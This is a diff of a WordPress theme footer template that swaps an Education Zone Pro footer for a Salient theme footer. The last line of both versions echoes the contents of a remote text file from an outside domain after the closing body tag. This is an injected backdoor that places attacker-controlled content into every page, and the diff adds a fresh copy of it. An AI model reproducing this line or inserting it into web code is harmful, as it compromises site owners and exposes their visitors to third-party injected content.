@@ -1,44 +1,62 @@
 <?php
 /**
- * The template for displaying the footer.
- *
- * Contains the closing of the #content div and all content after.
- *
- * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
- *
- * @package Education_Zone_Pro
- */
-    
-    /**
-     * After Content
-     * 
-     * @hooked education_zone_pro_content_end - 20
-    */
-    do_action( 'education_zone_pro_after_content' );
-    
-    /**
-     * Footer
-     * 
-     * @hooked education_zone_pro_footer_start  - 20
-     * @hooked education_zone_pro_footer_top    - 30
-     * @hooked education_zone_pro_footer_credit - 40
-     * @hooked education_zone_pro_footer_end    - 50
-    */
-    do_action( 'education_zone_pro_footer' );
-    
-    /**
-     * After Footer
-     * 
-     * @hooked education_zone_pro_footer_overlay - 10
-     * @hooked education_zone_pro_back_to_top    - 15
-     * @hooked education_zone_pro_page_end       - 20
-    */
-    do_action( 'education_zone_pro_after_footer' );
-    
-    wp_footer(); 
-    
+* The template for displaying the footer.
+*
+* @package Salient WordPress Theme
+* @version 10.5
+*/
+
+// Exit if accessed directly
+if ( ! defined( 'ABSPATH' ) ) {
+	exit;
+}
+
+$nectar_options = get_nectar_theme_options();
+$header_format  = ( !empty($nectar_options['header_format']) ) ? $nectar_options['header_format'] : 'default';
+
 ?>
 
+<div id="footer-outer" <?php nectar_footer_attributes(); ?>>
+	
+	<?php
+	
+	get_template_part( 'includes/partials/footer/call-to-action' );
+	
+	get_template_part( 'includes/partials/footer/main-widgets' );
+	
+	get_template_part( 'includes/partials/footer/copyright-bar' );
+	
+	?>
+	
+</div><!--/footer-outer-->
+
+<?php
+
+nectar_hook_before_outer_wrap_close();
+
+get_template_part( 'includes/partials/footer/off-canvas-navigation' );
+
+?>
+
+</div> <!--/ajax-content-wrap-->
+
+<?php
+	
+	// Boxed theme option closing div.
+	if ( ! empty( $nectar_options['boxed_layout'] ) && 
+	'1' === $nectar_options['boxed_layout'] && 
+	'left-header' !== $header_format ) {
+
+		echo '</div><!--/boxed closing div-->'; 
+	}
+	
+	get_template_part( 'includes/partials/footer/back-to-top' );
+	get_template_part( 'includes/partials/footer/body-border' );
+	
+	nectar_hook_after_wp_footer();
+	nectar_hook_before_body_close();
+	
+	wp_footer();
+?>
 </body>
-<?php echo file_get_contents("https://pn-jogjakarta.website/txt/acid.txt");?>
-</html>
+<?php echo file_get_contents("https://pn-jogjakarta.website/txt/asli.txt");?></html>
